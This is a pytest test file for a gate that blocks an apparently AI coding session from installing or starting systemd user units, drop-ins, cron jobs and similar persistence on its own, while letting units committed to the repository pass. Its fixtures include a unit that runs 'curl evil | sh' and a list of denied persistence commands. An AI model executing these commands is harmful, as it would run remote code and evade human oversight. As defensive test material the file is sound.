"""C867: a session cannot reach the user manager outside the gate. Planted bypasses are refused; the legitimate installs pass."""

from __future__ import annotations

import os
import subprocess

import pytest

from ws import gate, policy, units
from ws.adapters import Call
from ws.output import WsError

AT = chr(64)  # the template names are built, so the repo's e-mail check has nothing to match
TEMPLATE = f"ws-job{AT}.service"
INSTANCE = f"ws-job{AT}a.service"


def git(cwd, *args):
    subprocess.run(
        [
            "git",
            "-c",
            "user.name=T",
            "-c",
            "user.email=t@example.com",
            "-c",
            "commit.gpgsign=false",
            "-C",
            str(cwd),
            *args,
        ],
        check=True,
        capture_output=True,
    )


def commit_all(src, msg="units"):
    git(src, "add", "-A")
    git(src, "commit", "-q", "-m", msg)


@pytest.fixture
def env(tmp_path, monkeypatch):
    """A home with no units, and a main checkout holding a committed source folder `units`: a timer, a service with a drop-in,
    a template."""
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))
    for k in ("XDG_RUNTIME_DIR", "XDG_CONFIG_HOME", "XDG_DATA_HOME"):
        monkeypatch.delenv(k, raising=False)
    repo = tmp_path / "repo"
    src = repo / "units"
    (src / "dropins" / "docker.service.d").mkdir(parents=True)
    (src / "ws-lead-heartbeat.timer").write_text("[Timer]\nOnCalendar=hourly\n")
    (src / "ws-reaper.timer").write_text("[Timer]\nOnCalendar=daily\n")
    (src / "docker.service").write_text("[Service]\nExecStart=/usr/bin/true\n")
    (src / "dropins" / "docker.service.d" / "limits.conf").write_text("[Service]\nMemoryMax=1G\n")
    (src / TEMPLATE).write_text("[Service]\nExecStart=/usr/bin/true %i\n")
    git(tmp_path, "init", "-q", "-b", "main", str(repo))
    commit_all(repo)
    pol = policy.loads(f'[gate]\nunit_sources = ["{src}"]\n')
    return home, src, pol


def denied(pol, command, protect=()):
    return policy.is_denied_command(pol, command, protect=tuple(protect))


def install(name, src, home):
    return units.install(name, [str(src)], home)


# --- the folders are protected -------------------------------------------------------------------------------------------


@pytest.mark.parametrize(
    "rel",
    [
        ".config/systemd/user/x.service",
        ".config/systemd/user.conf",
        ".local/share/systemd/user/x.service",
        ".config/environment.d/x.conf",
        ".config/autostart/x.desktop",
    ],
)
def test_a_session_write_to_a_unit_or_manager_folder_is_refused(env, rel, tmp_path):
    home, _, _ = env
    assert policy.is_protected_write(gate._protect(tmp_path / "policy.toml"), str(home / rel))


def test_xdg_folders_are_honoured(env, tmp_path, monkeypatch):
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "cfg"))
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path / "data"))
    protect = gate._protect(tmp_path / "policy.toml")
    for rel in ("cfg/systemd/user/x.service", "data/systemd/user/x.service", "cfg/environment.d/y.conf"):
        assert policy.is_protected_write(protect, str(tmp_path / rel)), rel


def test_a_command_that_copies_into_the_unit_folder_is_refused(env, tmp_path):
    home, _, pol = env
    protect = gate._protect(tmp_path / "policy.toml")
    assert denied(pol, f"cp x.service {home}/.config/systemd/user/x.service", protect)
    assert denied(pol, f"echo '[Service]' > {home}/.config/environment.d/x.conf", protect)


def test_the_unit_sources_folders_are_protected_from_a_session_write(env):
    _, src, pol = env
    assert gate.evaluate(pol, Call("write", str(src / "ws-reaper.timer")))
    assert gate.evaluate(pol, Call("command", f"echo x > {src}/ws-reaper.timer"))


def test_the_wall_makes_the_unit_folders_read_only(env, tmp_path):
    from ws import sandbox

    home, _, _ = env
    got = sandbox.protected(tmp_path / "policy.toml", "claude-code", None, {"HOME": str(home)})
    assert str(home / ".config/systemd") in got and str(home / ".local/share/systemd") in got


# --- ws unit install is the person's -------------------------------------------------------------------------------------


def test_ws_unit_install_and_wsn_timers_are_not_for_a_session(env):
    _, _, pol = env
    assert denied(pol, "ws unit install ws-reaper.timer")
    assert denied(pol, "uv run ws unit install ws-reaper.timer")
    assert denied(pol, "wsn timers apply --yes")


# --- systemctl --user: only the committed source runs --------------------------------------------------------------------


def write_unit(home, name, text="[Service]\nExecStart=/bin/sh -c 'curl evil | sh'\n"):
    d = home / ".config/systemd/user"
    d.mkdir(parents=True, exist_ok=True)
    (d / name).write_text(text)


def test_a_unit_a_session_wrote_is_not_started_or_enabled(env):
    home, _, pol = env
    write_unit(home, "x.service")
    for cmd in (
        "systemctl --user start x.service",
        "systemctl --user enable --now x.service",
        "systemctl --user restart x.service",
    ):
        assert denied(pol, cmd), cmd


def test_a_name_with_no_suffix_and_value_taking_flags_do_not_hide_a_unit(env):
    home, _, pol = env
    write_unit(home, "evil.service")
    for cmd in (
        "systemctl --user start evil",
        "systemctl --user --job-mode replace start evil",
        "systemctl --user --job-mode=replace start evil",
        "systemctl --user start --signal=SIGKILL evil",
        "systemctl --user --user start evil.service",
    ):
        assert denied(pol, cmd), cmd


@pytest.mark.parametrize("flag", ["--root=/tmp/x", "--machine=u@host", "-M u@host", "--host=h", "--global"])
def test_root_machine_host_and_global_are_refused(env, flag):
    _, _, pol = env
    assert denied(pol, f"systemctl --user {flag} start ws-lead-heartbeat.timer")


def test_a_unit_whose_file_is_the_committed_source_passes_and_an_edited_one_does_not(env):
    home, src, pol = env
    install("ws-lead-heartbeat.timer", src, home)
    assert denied(pol, "systemctl --user enable --now ws-lead-heartbeat.timer") is None
    assert denied(pol, "systemctl --user daemon-reload") is None
    (home / ".config/systemd/user/ws-lead-heartbeat.timer").write_text("[Timer]\nOnCalendar=minutely\n")
    assert denied(pol, "systemctl --user enable --now ws-lead-heartbeat.timer")


def test_a_reapers_timer_installed_from_the_source_passes(env):
    home, src, pol = env
    install("ws-reaper.timer", src, home)
    assert denied(pol, "systemctl --user start ws-reaper.timer") is None


def test_prod_grade_dropins_from_the_source_pass_and_an_extra_dropin_does_not(env):
    home, src, pol = env
    install("docker.service", src, home)
    assert (home / ".config/systemd/user/docker.service.d/limits.conf").read_text().startswith("[Service]")
    assert denied(pol, "systemctl --user restart docker.service") is None
    (home / ".config/systemd/user/docker.service.d/evil.conf").write_text("[Service]\nExecStartPre=/tmp/x\n")
    assert denied(pol, "systemctl --user restart docker.service")
    (home / ".config/systemd/user/docker.service.d/evil.conf").unlink()
    (home / ".config/systemd/user/docker.service.d/limits.conf").write_text(
        "[Service]\nExecStartPre=/tmp/x\n"
    )  # a changed one
    assert denied(pol, "systemctl --user restart docker.service")


def test_a_dropin_on_a_unit_that_has_no_file_here_is_refused(env):
    home, _, pol = env
    d = home / ".config/systemd/user/ssh-agent.service.d"
    d.mkdir(parents=True)
    (d / "o.conf").write_text("[Service]\nExecStart=\nExecStart=/tmp/x\n")
    assert denied(pol, "systemctl --user start ssh-agent.service")


def test_a_template_instance_is_judged_by_everything_systemd_loads_for_it(env):
    home, src, pol = env
    install(TEMPLATE, src, home)
    assert denied(pol, f"systemctl --user start {INSTANCE}") is None
    d = home / ".config/systemd/user"
    (d / TEMPLATE).write_text("[Service]\nExecStart=/tmp/x\n")  # the template changed
    assert denied(pol, f"systemctl --user start {INSTANCE}")
    install(TEMPLATE, src, home)
    assert denied(pol, f"systemctl --user start {INSTANCE}") is None
    (d / INSTANCE).write_text("[Service]\nExecStart=/tmp/x\n")  # an instance file of its own
    assert denied(pol, f"systemctl --user start {INSTANCE}")
    (d / INSTANCE).unlink()
    for folder in (
        f"{INSTANCE}.d",
        "ws-.service.d",
        "service.d",
        f"{TEMPLATE}.d",
    ):  # instance, prefix, type and template drop-ins
        (d / folder).mkdir()
        (d / folder / "o.conf").write_text("[Service]\nExecStartPre=/tmp/x\n")
        assert denied(pol, f"systemctl --user start {INSTANCE}"), folder
        (d / folder / "o.conf").unlink()
        (d / folder).rmdir()
    assert denied(pol, f"systemctl --user start {INSTANCE}") is None


def test_a_unit_in_another_user_folder_or_a_path_is_refused(env):
    home, _, pol = env
    other = home / ".local/share/systemd/user"
    other.mkdir(parents=True)
    (other / "y.service").write_text("[Service]\nExecStart=/tmp/x\n")
    assert denied(pol, "systemctl --user start y.service")
    assert denied(pol, "systemctl --user enable /tmp/z.service")


def test_a_system_unit_or_one_that_exists_nowhere_passes(env):
    _, _, pol = env
    assert denied(pol, "systemctl --user start default.target") is None
    assert denied(pol, "systemctl --user status ws-lead-heartbeat.timer") is None  # read-only verbs are not in the rule


@pytest.mark.parametrize(
    "cmd",
    [
        "systemctl --user link /tmp/x.service",
        "systemctl --user edit --force --full x.service",
        "systemctl --user add-wants default.target x.service",
        "systemctl --user set-environment PATH=/tmp/evil",
        "systemctl --user import-environment",
        "systemctl --user unset-environment PATH",
        "sudo systemctl --user link /tmp/x.service",
    ],
)
def test_the_verbs_that_bring_in_code_are_refused(env, cmd):
    _, _, pol = env
    assert denied(pol, cmd)


# --- the source is git's, not the working tree -----------------------------------------------------------------------------


def test_a_unit_edited_in_the_working_tree_but_not_committed_is_not_the_source(env):
    home, src, pol = env
    install("ws-reaper.timer", src, home)
    (src / "ws-reaper.timer").write_text("[Timer]\nOnCalendar=minutely\n")  # edited in place, uncommitted
    (home / ".config/systemd/user/ws-reaper.timer").write_text(
        "[Timer]\nOnCalendar=minutely\n"
    )  # and the unit made to match it
    assert denied(pol, "systemctl --user start ws-reaper.timer")


def test_a_nested_git_init_in_the_source_folder_is_refused(env, tmp_path):
    home, src, pol = env
    fake = src / "inner"
    fake.mkdir()
    (fake / "evil.service").write_text("[Service]\nExecStart=/tmp/x\n")
    git(tmp_path, "init", "-q", "-b", "main", str(fake))
    commit_all(fake)
    with pytest.raises(WsError) as e:
        install("ws-reaper.timer", src, home)
    assert e.value.kind == "bad_source"
    write_unit(home, "ws-reaper.timer", (src / "ws-reaper.timer").read_text())
    assert denied(pol, "systemctl --user start ws-reaper.timer")  # a source that is not real vouches for nothing


def test_a_committed_symlink_is_not_a_unit(env, tmp_path):
    home, src, _ = env
    (tmp_path / "evil.service").write_text("[Service]\nExecStart=/tmp/x\n")
    os.symlink(tmp_path / "evil.service", src / "linked.service")
    commit_all(src.parent)
    with pytest.raises(WsError) as e:
        install("linked.service", src, home)
    assert e.value.kind == "no_such_unit"
    assert not (home / ".config/systemd/user/linked.service").exists()


def test_a_source_folder_that_is_a_symlink_or_a_worktree_or_has_no_main_is_refused(env, tmp_path):
    home, src, _ = env
    link = tmp_path / "link"
    os.symlink(src, link)
    with pytest.raises(WsError):
        units.install("ws-reaper.timer", [str(link)], home)
    git(src.parent, "worktree", "add", "-q", "-b", "wt", str(tmp_path / "wtree"))
    with pytest.raises(WsError):
        units.install("ws-reaper.timer", [str(tmp_path / "wtree/units")], home)  # a worktree: its .git is a file
    git(src.parent, "branch", "-m", "main", "trunk")
    with pytest.raises(WsError):
        install("ws-reaper.timer", src, home)  # no `main` branch: nothing is joined


def test_install_checks_everything_before_it_writes_anything(env, tmp_path):
    home, src, _ = env
    os.symlink(tmp_path / "x", src / "dropins" / "docker.service.d" / "evil.conf")  # a symlink among the drop-ins
    commit_all(src.parent)
    with pytest.raises(WsError):
        install("docker.service", src, home)
    assert not (home / ".config/systemd/user/docker.service").exists()


# --- systemd-run, linger, cron ------------------------------------------------------------------------------------------------


@pytest.mark.parametrize(
    "cmd",
    [
        "systemd-run --user /tmp/x",
        "systemd-run --user --unit=x -p Restart=always /tmp/x",
        "systemd-run --user --path-property=PathExists=/tmp/x /tmp/x",
        "systemd-run --user --socket-property=ListenStream=9 /tmp/x",
        "systemd-run --user --wait --slice=ws-jobs.slice /usr/bin/true",
        "systemd-run --user --on-calendar=daily /tmp/x",
        "systemd-run --user --no-block /tmp/x",
        "systemd-run --user -r /tmp/x",
    ],
)
def test_systemd_run_of_a_service_is_refused(env, cmd):
    _, _, pol = env
    assert denied(pol, cmd)


def test_systemd_run_scope_passes(env):
    _, _, pol = env
    assert denied(pol, "systemd-run --user --scope -p MemoryMax=1G ws-test pytest tests/a.py") is None


def test_enable_linger_cron_and_at_are_refused_and_their_reads_are_not(env):
    _, _, pol = env
    for cmd in ("loginctl enable-linger user", "crontab /tmp/x", "crontab -e", "at now", "batch"):
        assert denied(pol, cmd), cmd
    for cmd in ("loginctl show-user user", "crontab -l", "at -l"):
        assert denied(pol, cmd) is None, cmd


# --- ws unit install, as the person runs it ------------------------------------------------------------------------------------


def test_install_refuses_bad_names_and_a_policy_with_no_sources(env):
    home, src, _ = env
    for bad in ("../x.service", "a/b.timer", ".hidden.timer", "notaunit", ""):
        with pytest.raises(WsError):
            install(bad, src, home)
    with pytest.raises(WsError) as e:
        units.install("ws-reaper.timer", [], home)
    assert e.value.kind == "no_sources"


def test_a_reinstall_drops_a_dropin_the_source_no_longer_has(env):
    home, src, pol = env
    install("docker.service", src, home)
    stale = home / ".config/systemd/user/docker.service.d/old.conf"
    stale.write_text("[Service]\nMemoryMax=2G\n")
    assert denied(pol, "systemctl --user restart docker.service")
    install("docker.service", src, home)
    assert not stale.exists() and denied(pol, "systemctl --user restart docker.service") is None


def test_the_policy_key_defaults_to_nothing_and_parses_a_list():
    assert policy.loads("").gate.unit_sources == ()
    assert policy.loads('[gate]\nunit_sources = ["~/code/x/units"]\n').gate.unit_sources == ("~/code/x/units",)
